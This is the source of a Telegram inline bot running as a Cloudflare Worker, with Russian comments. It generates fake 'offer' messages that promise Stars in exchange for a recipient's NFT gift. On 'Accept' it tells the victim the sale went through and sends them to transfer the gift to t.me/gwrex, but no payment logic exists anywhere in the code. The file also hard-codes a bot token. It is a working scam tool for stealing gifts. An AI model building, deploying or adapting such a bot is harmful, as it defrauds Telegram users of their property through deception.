const ADMIN_ID = 5151757168; // Ваш ID
const BOT_TOKEN = "9231998177:AAEFkqiFf9ihgkzjBk-DJJSoeyh149pUmew"; // ВАШ ТОКЕН

// ==========================================
// БЕЛЫЙ СПИСОК (КОМУ МОЖНО ПОЛЬЗОВАТЬСЯ)
// ==========================================
// Вписывайте ID через запятую (без кавычек)
const ALLOWED_IDS = [
  5151757168, // Ваш ID
  // 123456789, // Сюда добавляйте ID других игроков
];

// Вписывайте @юзернеймы в кавычках (без символа @)
const ALLOWED_USERNAMES = [
  "nogannopervi", // Пример (текущий игрок)
];

export default {
  async fetch(request, env, ctx) {
    if (request.method !== "POST") return new Response("OK", { status: 200 });

    try {
      const update = await request.json();

      // --- /start ---
      if (update.message && update.message.text === "/start") {
        const chatId = update.message.chat.id;
        const userId = update.message.from.id;
        const username = update.message.from.username ? update.message.from.username.toLowerCase() : "";

        const isAdmin = userId === ADMIN_ID;
        const isAllowed = ALLOWED_IDS.includes(userId) || (username && ALLOWED_USERNAMES.includes(username));
        
        let text = "";
        if (!isAdmin && !isAllowed) {
          text = `🔒 <b>Доступ закрыт.</b>\n\nЭтот бот приватный.\nОбратитесь к владельцу.\n\nВаш ID: <code>${userId}</code>`;
        } else {
          text = `🎁 <b>NFT OFFER BOT</b> ||\n\n✅ <b>Пользователь · Gift</b>\n🆔 <b>Ваш ID:</b> <code>${userId}</code>\n⏳ <b>Доступ:</b> ∞ бессрочно\n\nОткрой чат и напиши:\n<code>@GarisOfferBot t.me/nft/ViceCream-355398 300 stars</code>`;
        }
        await callApi("sendMessage", { chat_id: chatId, text: text, parse_mode: "HTML" });
      }

      // --- INLINE (Создание офера) ---
      if (update.inline_query) {
        const iq = update.inline_query;
        const userId = iq.from.id;
        const username = iq.from.username ? iq.from.username.toLowerCase() : "";
        
        const isAdmin = userId === ADMIN_ID;
        const isAllowed = ALLOWED_IDS.includes(userId) || (username && ALLOWED_USERNAMES.includes(username));

        if (!isAdmin && !isAllowed) return new Response("OK", { status: 200 });

        // Умный парсинг: ищем любые цифры (сумма) и любую ссылку/название подарка
        const textQuery = iq.query.trim();
        const numMatch = textQuery.match(/\d+/); 
        const giftMatch = textQuery.match(/(?:t\.me\/nft\/)?[A-Za-z0-9_-]+/); 

        const amount = numMatch ? numMatch[0] : "0";
        const giftId = giftMatch ? giftMatch[0] : "Подарок";

        let senderName = iq.from.first_name || "";
        if (iq.from.last_name) senderName += " " + iq.from.last_name;
        if (!senderName) senderName = iq.from.username ? "@" + iq.from.username : "Игрок";

        const text = `🎁 <b>Оффер на подарок</b>\n\n👤 <b>${senderName}</b> предлагает вам ${amount} ⭐ Stars за этот подарок.\n\n⏳ Предложение действительно 5 ч. 59 мин.`;

        const results = [{
          type: "article",
          id: "1",
          title: `Оффер от ${senderName}`,
          description: `За ${amount} ⭐ Stars`,
          input_message_content: { message_text: text, parse_mode: "HTML" },
          reply_markup: {
            inline_keyboard: [
              // Передаем ТОЛЬКО короткий код. Никакой базы.
              [{ text: "✅ Принять", callback_data: "acc" }],
              [{ text: "❌ Отклонить", callback_data: "dec" }]
            ]
          }
        }];

        await callApi("answerInlineQuery", { inline_query_id: iq.id, results: results, cache_time: 0 });
      }

      // --- КНОПКИ ---
      if (update.callback_query) {
        const cq = update.callback_query;
        const chatId = cq.message.chat.id;
        const messageId = cq.message.message_id;
        
        const hasCaption = !!cq.message.caption;
        const messageText = cq.message.text || cq.message.caption || "";

        // Вытаскиваем сумму прямо из текста сообщения
        const amountMatch = messageText.match(/(\d+)\s*⭐/);
        const amount = amountMatch ? amountMatch[1] : "указанную сумму";

        if (cq.data === "acc") {
          // 1. МГНОВЕННО отвечаем (убираем загрузку, показываем Alert)
          await callApi("answerCallbackQuery", { 
            callback_query_id: cq.id, 
            text: `Market\nПредложение на продажу успешно принято.\n\nПередайте подарок покупателю, чтобы получить ${amount} ⭐`, 
            show_alert: true 
          });

          // 2. Меняем сообщение (в try/catch на случай если Telegram затупит)
          try {
            const newText = `✓ <b>Предложение успешно принято.</b>\n\nПередайте подарок покупателю, чтобы получить ${amount} ⭐.`;
            const newMarkup = { 
              inline_keyboard: [[{ text: "Передать NFT ↗", url: "https://t.me/gwrex" }]] 
            };

            if (hasCaption) {
              await callApi("editMessageCaption", { chat_id: chatId, message_id: messageId, caption: newText, parse_mode: "HTML", reply_markup: newMarkup });
            } else {
              await callApi("editMessageText", { chat_id: chatId, message_id: messageId, text: newText, parse_mode: "HTML", reply_markup: newMarkup });
            }
          } catch (e) { console.error(e); }
        } 
        else if (cq.data === "dec") {
          // 1. МГНОВЕННО отвечаем (убираем загрузку)
          await callApi("answerCallbackQuery", { callback_query_id: cq.id });

          // 2. Меняем сообщение
          try {
            const newText = `× Оффер отклонён.`;
            const emptyMarkup = { inline_keyboard: [] };

            if (hasCaption) {
              await callApi("editMessageCaption", { chat_id: chatId, message_id: messageId, caption: newText, parse_mode: "HTML", reply_markup: emptyMarkup });
            } else {
              await callApi("editMessageText", { chat_id: chatId, message_id: messageId, text: newText, parse_mode: "HTML", reply_markup: emptyMarkup });
            }
          } catch (e) { console.error(e); }
        }
      }

      return new Response("OK", { status: 200 });
    } catch (error) {
      console.error("КРИТИЧЕСКАЯ ОШИБКА:", error.message);
      return new Response("Error: " + error.message, { status: 500 });
    }
  }
};

async function callApi(method, body) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
  try {
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body)
    });
    return await response.json();
  } catch (e) {
    console.error("Ошибка Fetch:", e.message);
    throw e;
  }
}